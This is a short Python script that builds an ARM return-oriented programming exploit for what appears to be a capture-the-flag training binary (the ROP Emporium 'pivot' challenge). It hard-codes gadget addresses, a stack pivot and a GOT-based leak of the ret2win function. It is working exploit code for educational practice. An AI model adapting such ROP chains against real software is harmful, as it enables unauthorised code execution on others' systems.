#!/usr/bin/python3

from ropchain import *

# Gadgets / Useful addresses

FOOTHOLD_GOT        = 0x0002102c
FOOTHOLD_PLT        = 0x0001064c
FOOTHOLD_OFF        = 0x00000834
RET2WIN_OFF         = 0x000009c0
POP_R4_PC           = 0x00010760
POP_R3_PC           = 0x000105d4
POP_R4_TO_10_PC     = 0x00010984
MOV_R0_R7           = 0x00010974
SWAP_R4_SP          = 0x000108f0
DEREF_R0_FPM16      = 0x00010900
ADD_FPM16_TO_R0     = 0x0001090c
MOV_LR_R4_MOV_R3_R7 = 0x0001091c
LDR_R3_R7           = 0x00010924
BLX_R3              = LDR_R3_R7 + 8
DATA_SECTION        = 0x00021040

WIN_OFFSET          = RET2WIN_OFF - FOOTHOLD_OFF
PIVOT_ADDR          = 0x3fdfef08

# ROP

import sys

if len(sys.argv) > 1 and sys.argv[1] == "ROP":
    rop = pack4(0) + pack4(FOOTHOLD_GOT + 16)
    
    rop += pack4(POP_R3_PC)
    rop += pack4(MOV_LR_R4_MOV_R3_R7 + 1) + pack4(POP_R4_TO_10_PC)

    rop += pack4(POP_R3_PC) + pack4(0) * 2 + pack4(FOOTHOLD_PLT) + pack4(0) * 3 + pack4(BLX_R3)
    rop += pack4(MOV_LR_R4_MOV_R3_R7 + 1) + pack4(POP_R4_TO_10_PC) 
    
    rop += pack4(LDR_R3_R7) + pack4(0) * 2 + pack4(POP_R3_PC) + pack4(0) * 3 + pack4(BLX_R3)
    rop += pack4(POP_R3_PC) + pack4(POP_R4_TO_10_PC)
    
    rop += pack4(0) * 3 + pack4(WIN_OFFSET) + pack4(0) * 3 + pack4(MOV_R0_R7)
    rop += pack4(MOV_LR_R4_MOV_R3_R7 + 1) + pack4(POP_R4_TO_10_PC)
    
    rop += pack4(LDR_R3_R7) + pack4(0) * 2 + pack4(ADD_FPM16_TO_R0) + pack4(0) * 3 + pack4(BLX_R3)
else:
    rop = pad(36)
    rop += pack4(POP_R4_PC)
    rop += pack4(PIVOT_ADDR)
    rop += pack4(SWAP_R4_SP)

echo(rop)
